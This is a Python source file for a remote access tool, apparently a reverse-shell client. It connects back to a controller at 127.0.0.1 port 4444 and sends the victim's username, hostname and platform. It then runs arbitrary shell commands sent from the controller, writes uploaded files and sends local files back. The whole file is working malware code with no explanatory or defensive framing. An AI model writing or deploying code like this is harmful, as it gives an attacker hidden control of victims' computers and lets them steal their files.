host = '127.0.0.1'
port = 4444

import os
import socket
import platform
from time import sleep
import subprocess

client = socket.socket()
def init(text):
    while True:
        try:
            client.connect((host, port))
            client.send(text.encode('gbk'))
            break
        except Exception:
            sleep(30)
def getprompt():
    if 'Linux' in systemv:
        if os.getuid() ==0 :
            return 'root@'+socket.gethostname()+':'+os.getcwd()+'#'
        else:
            return os.getlogin()+'@'+socket.gethostname()+':'+os.getcwd()+'$'
    else:
        return os.getcwd()+'>'
if __name__ == '__main__':
    systemv = os.getlogin() +'/'+ socket.gethostname()+'/'+platform.platform()
    text = getprompt() +'`'+systemv
    init(text)

    while True:
        cmd = client.recv(1024).decode('gbk')
        print(cmd)
        other = cmd.split(' ')
        first = other[0]
        if first == 'mantis':
            pass
        elif first == 'cd':
            try:
                os.chdir(other[1])
                prompt = getprompt()
                client.send(prompt.encode('gbk'))
            except Exception:
                client.send(prompt.encode('gbk'))
        elif first == 'shell':
            if len(other) > 1:
                ccmd =''
                for i in range(1,len(other)):
                    ccmd += other[i] +' '
                res = subprocess.Popen(ccmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                result, _ = res.communicate()
                try:
                    client.send(result)
                    client.send("``````````".encode('gbk'))
                except Exception:
                    init(text)
        elif first == 'upload':
            dst = other[1]
            fsize = int(other[2])
            content = client.recv(fsize)
            with open(dst,'wb') as f:
                f.write(content)

        elif first == 'download':
            src = other[1]
            try:
                if os.path.isfile(src):
                    fsize = os.path.getsize(src)
                    client.send(str(fsize).encode('gbk'))
                    with open(src,'rb') as f:
                        content = f.read()
                        client.send(content)
                else:
                    client.send(b'0')
            except Exception:
                init(text)